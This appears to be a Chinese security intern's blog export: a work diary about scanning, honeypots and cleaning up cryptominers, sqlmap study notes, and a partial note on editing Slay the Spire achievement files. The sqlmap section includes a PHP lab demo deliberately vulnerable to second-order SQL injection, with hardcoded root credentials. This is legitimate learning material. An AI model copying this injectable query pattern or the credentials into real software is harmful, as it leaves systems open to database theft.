<h3 id="22、23日"><a href="#22、23日" class="headerlink" title="22、23日"></a>22、23日</h3><p>测试蜜罐跟微步情报和飞书结合，感觉挺好用。</p>
<p>有机器中毒了，上去找了半天有没找到毒，希望之后能够得出结论。</p>
<h3 id="24日-1"><a href="#24日-1" class="headerlink" title="24日"></a>24日</h3><p>安了msf，熟练了msf使用遇事不决就</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info d</span><br></pre></td></tr></table></figure>

<p>fscan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/nanhe7/p/15966742.htm</span><br></pre></td></tr></table></figure>

<h3 id="27日、28日"><a href="#27日、28日" class="headerlink" title="27日、28日"></a>27日、28日</h3><p>干杂活刷leetcode摸鱼的一天</p>
<h3 id="29日、30日"><a href="#29日、30日" class="headerlink" title="29日、30日"></a>29日、30日</h3><p>干杂活、绿盟扫，看漏洞。和知道创宇的讨论渗透测试服务。</p>
<h2 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h2><h3 id="01日-1"><a href="#01日-1" class="headerlink" title="01日"></a>01日</h3><p>请了半天假，还是日常活。之后好像有两家公司（360、知道创宇）要来攻防演练，希望能够有意思qaq</p>
<p><del>360提了两种放置：众测、人力天，现在才知道众测算是被白嫖了。。。</del></p>
<h3 id="04日"><a href="#04日" class="headerlink" title="04日"></a>04日</h3><p>fscan扫了下云端办公网段，发现不少弱口令，还有hadoop未授权访问。也扫了华为云、阿里云，然后就是些日常活</p>
<h3 id="05日"><a href="#05日" class="headerlink" title="05日"></a>05日</h3><p>日常活，摸鱼，搭waf，看雷池api，超级弱口令扫弱密码<a href="https://zhuanlan.zhihu.com/p/543309378">【附下载】爆破神器之超级弱口令检查工具使用 - 知乎 (zhihu.com)</a>，明天批量改密码</p>
<h3 id="06日-1"><a href="#06日-1" class="headerlink" title="06日"></a>06日</h3><p>发工资了，上w爽死了</p>
<p>日常活加写批量修改密码脚本。然后搭建yadcc环境，争取把源码看懂，和项目结构及对应配置看懂。</p>
<h3 id="07、08"><a href="#07、08" class="headerlink" title="07、08"></a>07、08</h3><p>yadcc</p>
<h3 id="11-15日"><a href="#11-15日" class="headerlink" title="11-15日"></a>11-15日</h3><p>日常活。学了下go。了解了分布式编译跑起来了yadcc、icecc。看了yadcc部分源码。<del>开始肝mit 854分布式lab</del></p>
<h3 id="18日"><a href="#18日" class="headerlink" title="18日"></a>18日</h3><p>发现挖矿机器，直接秒了（hadoop未授权访问，没啥好说的）</p>
<p>burp-autodecoder 还挺好用，能够爆破进行签名校验的网页。zoomeye试了下公司账号发现不如fofa一根，资产巨少</p>
<p>摸鱼（</p>
<h3 id="19、20日"><a href="#19、20日" class="headerlink" title="19、20日"></a>19、20日</h3><p>写蜜罐文档，已经开始在每个b端搭建蜜罐了</p>
<h3 id="21日-1"><a href="#21日-1" class="headerlink" title="21日"></a>21日</h3><p>处理前天蜜罐发现的中毒机器，找了半天，nmmd在docker里面，真逆天</p>
<p>ps -ef 半天没啥有效信息，后面换成了 ps -elf</p>
<h3 id="25日、26日"><a href="#25日、26日" class="headerlink" title="25日、26日"></a>25日、26日</h3><p>摸鱼加杂活。绩效又a，我爱momenta</p>
<h3 id="27日-1"><a href="#27日-1" class="headerlink" title="27日"></a>27日</h3><p>有台机器挖矿还是命令执行的，以为弱口令进来的爆了半天。结果是开了vscode server，whoami直接是root，服了</p>
<h3 id="28日"><a href="#28日" class="headerlink" title="28日"></a>28日</h3><p>处理hdmap的出网域名，发现三个未授权访问。被批评工具一知半解，fscan、绿盟之前都不是全端口扫描</p>
<h3 id="29日"><a href="#29日" class="headerlink" title="29日"></a>29日</h3><p>日常活。要放假了大家都比较兴奋哈哈哈</p>
<h1 id="2024"><a href="#2024" class="headerlink" title="2024"></a>2024</h1><h2 id="1月"><a href="#1月" class="headerlink" title="1月"></a>1月</h2><h3 id="02日-1"><a href="#02日-1" class="headerlink" title="02日"></a>02日</h3><p>日常活</p>
<h3 id="03日-1"><a href="#03日-1" class="headerlink" title="03日"></a>03日</h3><p>呜呜呜，导师劝我好好研究研究代码，了解漏洞原理，还说有问题问她，太好了吧。</p>
<p>360渗透测试还是牛逼，直接钓鱼钓到了两个hr，直接cs上线了</p>
<h3 id="04日-1"><a href="#04日-1" class="headerlink" title="04日"></a>04日</h3><p>摸鱼复现大头ctf加日常活</p>
<h3 id="05日-1"><a href="#05日-1" class="headerlink" title="05日"></a>05日</h3><p>蜜罐终于要在每个B段搭好了，找人真麻烦。</p>
<p>感觉自己ctf水平跟之前比有质的提高，果然自己学学spring、go什么的还挺有用。</p>
<p>java 那些链感觉也有数了，能从更高的视角来看了。</p>
<p><a href="https://hackerqwq.github.io/2022/10/02/%E5%88%A9%E7%94%A8%E9%93%BE%E7%A5%9E%E5%99%A8-tabby%E4%BD%BF%E7%94%A8/">https://hackerqwq.github.io/2022/10/02/%E5%88%A9%E7%94%A8%E9%93%BE%E7%A5%9E%E5%99%A8-tabby%E4%BD%BF%E7%94%A8/</a></p>
<p><a href="https://cangqingzhe.github.io/2022/05/03/Tabby%E6%8C%96%E6%8E%98%E5%88%A9%E7%94%A8%E9%93%BE/">https://cangqingzhe.github.io/2022/05/03/Tabby%E6%8C%96%E6%8E%98%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>
<h3 id="08-20日"><a href="#08-20日" class="headerlink" title="08-20日"></a>08-20日</h3><p>开始写自动化代码了，WAF批量搭建、批量探活。</p>
<p>参与soc平台：flask+celery+sqlalchemy+ redis</p>
<p>代码水平极具增强但也很累。。。</p>
]]></content>
      <tags>
        <tag>security intership</tag>
      </tags>
  </entry>
  <entry>
    <title>sagemathStudy</title>
    <url>/2023/03/09/sagemathStudy/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>crypto sageMath</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap_study</title>
    <url>/2023/04/08/sqlmap-study/</url>
    <content><![CDATA[<p>参考：<a href="https://blog.csdn.net/q20010619/article/details/122243790">sqlmap深入分析-优质文章整理篇（sqlmap 源码分析、os-shell 原理、攻防角度使用sqlmap）_sqlmap源码分析_OceanSec的博客-CSDN博客</a></p>
<p>在使用sqlmap时存在以下的问题：</p>
<p>1、有回显的是如何判断哪个对应哪个的，如果回显编码了怎么办（如base64）</p>
<p>2、怎样判断是否存在注入？一个界面元素不少，如果只是单纯回显一些会变的垃圾信息呢</p>
<p>3、启发式测试是什么</p>
<p>……</p>
<p>[toc]</p>
<h2 id="我的测试环境"><a href="#我的测试环境" class="headerlink" title="我的测试环境"></a>我的测试环境</h2><p>sqlmap版本：1.5.10.17#dev</p>
<p>在buuctf上弄动态靶场</p>
<p>然后pycharm断点运行</p>
<h2 id="sqlmap自己分析"><a href="#sqlmap自己分析" class="headerlink" title="sqlmap自己分析"></a>sqlmap自己分析</h2><h2 id="sqlmap-项目剖析（I）-使用"><a href="#sqlmap-项目剖析（I）-使用" class="headerlink" title="sqlmap 项目剖析（I）-使用"></a>sqlmap 项目剖析（I）-使用</h2><h3 id="0x00-sqlmap-介绍"><a href="#0x00-sqlmap-介绍" class="headerlink" title="0x00 sqlmap 介绍"></a>0x00 sqlmap 介绍</h3><p>sqlmap 是一款开源的自动化 SQL 注入测试及漏洞利用工具，有着十余年的开发历史（当然这也造就了一些问题），这款工具最强大的地方在于它对数据库种类以及注入类型的支持堪称史诗级。</p>
<p><a href="https://www.anquanke.com/post/id/262848">sqlmap 项目剖析（I）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>使用懒得写了，上面的链接有说。</p>
<p>主要记录自己不是很熟练的部分。</p>
<p>1、指定 burp log 作为目标输入</p>
<p>首先开启 burpsuite 的请求日志记录功能</p>
<p>后续在抓包时相关的包会被保存到对应的日志文件里</p>
<p>此时结合 sqlmap -l 的参数即可对此日志中的数据包进行自动化注入测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l burp.log</span><br></pre></td></tr></table></figure>

<p>2、二次注入</p>
<p>sqlmap 同样支持二次注入场景下的测试与利用，这个功能主要是依赖于 <code>--second-*</code> 参数进行实现。</p>
<p>自己写了个简单的demo测试：</p>
<p>新建数据库test。</p>
<p>sql语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建second数据库</span><br><span class="line">CREATE DATABASE IF NOT EXISTS `second`;</span><br><span class="line"></span><br><span class="line">-- 使用second数据库</span><br><span class="line">USE `second`;</span><br><span class="line"></span><br><span class="line">-- 创建users表</span><br><span class="line">CREATE TABLE IF NOT EXISTS `users` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(255) NOT NULL,</span><br><span class="line">  `password` varchar(255) NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line">-- 插入测试数据</span><br><span class="line">INSERT INTO `users` (`id`, `username`, `password`) VALUES</span><br><span class="line">(1, &#x27;admin&#x27;, &#x27;admin123&#x27;),</span><br><span class="line">(2, &#x27;user1&#x27;, &#x27;password1&#x27;),</span><br><span class="line">(3, &#x27;user2&#x27;, &#x27;password2&#x27;);</span><br></pre></td></tr></table></figure>

<p>first.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建数据库连接</span></span><br><span class="line"><span class="comment">// 显示所有错误信息</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>; <span class="comment">// 数据库服务器地址</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;second&quot;</span>; <span class="comment">// 数据库名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// $password = addslashes($_GET[&#x27;password&#x27;]);</span></span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]); <span class="comment">// 转义特殊字符</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;replace into users(id,username,password)values(1,&#x27;admin&#x27;,&#x27;<span class="subst">$password</span>&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>second.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建数据库连接</span></span><br><span class="line"><span class="comment">// 显示所有错误信息</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;display_errors&#x27;, 1);</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;display_startup_errors&#x27;, 1);</span></span><br><span class="line"><span class="comment">// error_reporting(E_ALL);</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>; <span class="comment">// 数据库服务器地址</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;second&quot;</span>; <span class="comment">// 数据库名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="string">&#x27;select password from users where id=1;&#x27;</span>);</span><br><span class="line"><span class="comment">// 输出查询结果</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_ASSOC)) &#123;</span><br><span class="line">        <span class="comment">// echo var_dump($row);</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$result1</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="string">&quot;select * from users where password = &#x27;<span class="subst">$value</span>&#x27;;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result1</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$row1</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result1</span>, MYSQLI_ASSOC)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$row1</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$row1</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230426164201842.png" alt="image-20230426164201842"></p>
<h2 id="sqlmap-项目剖析（II）"><a href="#sqlmap-项目剖析（II）" class="headerlink" title="sqlmap 项目剖析（II）"></a>sqlmap 项目剖析（II）</h2><p><a href="https://www.anquanke.com/post/id/262847">sqlmap 项目剖析（II）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>sqlmap步骤：</p>
<ul>
<li>全局变量初始化</li>
<li>命令行参数解析</li>
<li>全局变量赋值</li>
<li>环境检查</li>
<li>目标连通性检查</li>
<li>WAF 探测</li>
<li>页面动态内容提取</li>
<li>参数动态性检测</li>
<li>启发式测试</li>
</ul>
<p>下面挑一点详细的看</p>
<h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Main function of sqlmap when running from command line.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dirtyPatches()</span><br><span class="line">        resolveCrossReferences()</span><br><span class="line">        checkEnvironment()</span><br><span class="line">        setPaths(modulePath())</span><br><span class="line">        banner()</span><br><span class="line"></span><br><span class="line">        args = cmdLineParser()</span><br><span class="line">        cmdLineOptions.update(args.__dict__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(args, <span class="string">&quot;__dict__&quot;</span>) <span class="keyword">else</span> args)</span><br><span class="line">        initOptions(cmdLineOptions)</span><br><span class="line"></span><br><span class="line">        init()</span><br><span class="line">        start()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>slay_the_spire</title>
    <url>/2023/04/16/slay-the-spire/</url>
    <content><![CDATA[<p>[toc]</p>
<p><a href="https://tieba.baidu.com/p/7717284033">【图片】杀戮尖塔安卓与PC端存档文件简介_杀戮尖塔吧_百度贴吧 (baidu.com)</a></p>
<p>参考<a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1541057&highlight=%C9%B1%C2%BE%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BDhttps://www.52pojie.cn/forum.php?mod=viewthread&tid=1541057&highlight=%C9%B1%C2%BE%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD">写一个杀戮尖塔存档修改器 - 『编程语言区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://www.bilibili.com/read/cv18587141/">杀戮尖塔(Slay the Spire)控制台指南（包括所有卡牌、遗物、药水、荒疫等中英对照） - 哔哩哔哩 (bilibili.com)</a></p>
<p><a href="https://sts.huijiwiki.com/wiki/%E6%88%90%E5%B0%B1">成就 - 杀戮尖塔&#x2F;尖塔奇兵（Slay the Spire）中文维基|攻略百科|考据资料|Steam - 灰机wiki (huijiwiki.com)</a></p>
<p><a href="https://www.bilibili.com/video/BV1PZ4y1v72F/?spm_id_from=333.788.recommend_more_video.-1&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">【杀戮尖塔】手机版资源获取（简介和评论区自取）_手机游戏热门视频 (bilibili.com)</a></p>
<p>开个坑，也算是学学代码。</p>
<p>直接全成就</p>
<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><h3 id="整体结构分析"><a href="#整体结构分析" class="headerlink" title="整体结构分析"></a>整体结构分析</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230416113151438.png" alt="image-20230416113151438"></p>
<h4 id="preferences"><a href="#preferences" class="headerlink" title="preferences"></a>preferences</h4><p>steam_autocloud.vdf:存appid的没啥用</p>
<p>STSAchievements：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;GUARDIAN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;GHOST_GUARDIAN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ADRENALINE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COME_AT_ME&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AUTOMATON&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PERFECT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COLLECTOR&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SHAPES&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SAPPHIRE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;TIME_EATER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SLIME_BOSS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;POWERFUL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CHAMP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;INFINITY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;YOU_ARE_NOTHING&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CROW&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AMETHYST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RUBY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;THE_PACT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;IMPERVIOUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PLAGUE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CATALYST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EMERALD&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AMETHYST_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RUBY_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_10&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;JAXXED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SPEED_CLIMBER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;TRANSIENT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;BARRICADED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EMERALD_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PURITY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;MINIMALIST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_20&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>存成就的（只有完成的才会在这里显示），之后测试下是否可以直接修改。达成全成就。</p>
<p>网上找到的，测试下能否直接全成就</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;LUCKY_DAY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;IMPERVIOUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;BARRICADED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;GHOST_GUARDIAN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CHAMP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CROW&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EMERALD&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PERFECT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SLIME_BOSS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ADRENALINE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SHAPES&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SAPPHIRE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COLLECTOR&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RUBY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;GUARDIAN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RUBY_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;THE_PACT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PLAGUE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AUTOMATON&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EMERALD_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;YOU_ARE_NOTHING&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;TIME_EATER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;POWERFUL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SAPPHIRE_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;THE_ENDING&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COME_AT_ME&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span 